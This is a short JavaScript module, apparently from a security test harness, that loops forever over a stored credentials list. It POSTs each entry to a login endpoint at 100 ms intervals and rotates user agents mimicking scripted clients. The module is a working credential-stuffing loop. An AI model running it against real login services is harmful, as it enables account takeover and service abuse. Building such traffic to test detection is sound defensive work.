const { sendRequest, wait } = require('../lib/http');
const credentials = require('../payloads/credentials');

async function run() {
  const userAgents = ['python-requests/2.28', 'curl/7.68', 'go-http-client/1.1'];
  
  while (true) {
    for (const cred of credentials) {
      const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
      
      await sendRequest('ATTACK', 'POST', '/api/auth/login', { 'User-Agent': ua }, cred);
      
      // Rapid fire
      await wait(100);
    }
    // Pause before next campaign
    await wait(10000);
  }
}

module.exports = run;
